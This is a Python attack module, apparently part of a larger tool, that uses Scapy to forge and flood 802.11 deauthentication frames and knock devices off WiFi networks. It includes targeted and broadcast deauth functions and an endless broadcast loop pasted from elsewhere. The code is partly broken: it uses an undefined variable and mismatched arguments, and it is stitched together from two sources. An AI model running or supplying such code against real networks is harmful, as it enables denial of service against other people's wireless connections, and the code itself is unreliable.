from scapy.all import *
import logger

log = None
is_initialized = False


def module_init(main_log: logger.Logger):
    """
    initializes attack modules
    :param main_log: logger
    """
    global log, is_initialized
    log = main_log
    is_initialized = True


def wifi_deauth_host(target_mac, iface_name, persist=False):
    deauth_packet = RadioTap() / Dot11(addr1=target_mac, addr2="ff:ff:ff:ff:ff:ff", addr3="ff:ff:ff:ff:ff:ff") / Dot11Deauth()
    sendp(deauth_packet,iface=iface_name, count=100, inter=0.1, verbose=False)


def wifi_deauth_all(gateway, persist=False):
    wifi_deauth_host(ETHER_BROADCAST, gateway, persist)

#from github

scapy.all.conf.verbose = False
PID_FILE = "/var/run/deauth.pid"
WIRELESS_FILE = "/proc/net/wireless"
DEV_FILE = "/proc/net/dev"
PACKET_COUNT = 2000
GREEN = '\033[92m'
RED = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
PATTREN = {"MAC Address": 'Address:(.*)',
            "ESSID": 'ESSID:(.*)',
            "ID": '(.*) - Address'}
def send_deauth(mac, mon):
    pkt = scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=mac[0], addr3=mac[0])/scapy.all.Dot11Deauth()
    print (GREEN+"[*] Sending Deauthentication Packets to -> "+mac[1]+ENDC)
    while True:
        try:
            sys.stdout.write("\b{}".format(next(spin)))
            sys.stdout.flush()
            scapy.all.sendp(pkt, iface=mon, count=1, inter=.2, verbose=0)
        except KeyboardInterrupt:
            print ("\n")
            exit(0)